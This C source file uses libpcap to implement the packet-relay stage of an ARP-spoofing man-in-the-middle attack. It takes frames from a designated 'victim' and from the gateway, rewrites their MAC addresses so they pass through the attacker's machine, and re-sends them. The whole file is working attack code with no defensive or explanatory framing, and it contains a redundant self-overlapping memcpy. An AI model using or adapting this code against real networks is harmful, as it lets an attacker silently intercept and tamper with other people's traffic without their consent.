#include "myHeader.h"
int packetRedirect(pcap_t* handle, struct pcap_pkthdr* pktHeader, const u_char* packet, PLANINFO LanInfo)
{
	PTCPHEADER header;
	header = (PTCPHEADER)packet;
	u_short ether_type = ntohs(header->ethernet.ether_Type);
	/* ipv4 : 0x0800 */
	if (ether_type == 0x0800)
	{
		if (checkVictim(&header->ethernet, LanInfo))
		{
			/* send to router */
			memcpy(header->ethernet.dst_MAC, LanInfo->gatewayMAC, sizeof(u_char) * MACLEN);
			memcpy(header->ethernet.src_MAC, LanInfo->myMAC, sizeof(u_char) * MACLEN);
			memcpy((char *)packet, header, pktHeader->len);
			if (pcap_sendpacket(handle, packet, pktHeader->len /* size */) != 0)
			{
				fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(handle));
				return 0;
			}
		}
		else if (checkGateWay(&header->ethernet, LanInfo))
		{
			/* send to victim */
			memcpy(header->ethernet.dst_MAC, LanInfo->victimMAC, sizeof(u_char) * MACLEN);
			memcpy(header->ethernet.src_MAC, LanInfo->myMAC, sizeof(u_char) * MACLEN);
			memcpy((char *)packet, header, pktHeader->len);
			if (pcap_sendpacket(handle, packet, pktHeader->len /* size */) != 0)
			{
				fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(handle));
				return 0;
			}
		}
		else
			return 0;
	}
	return 0;
}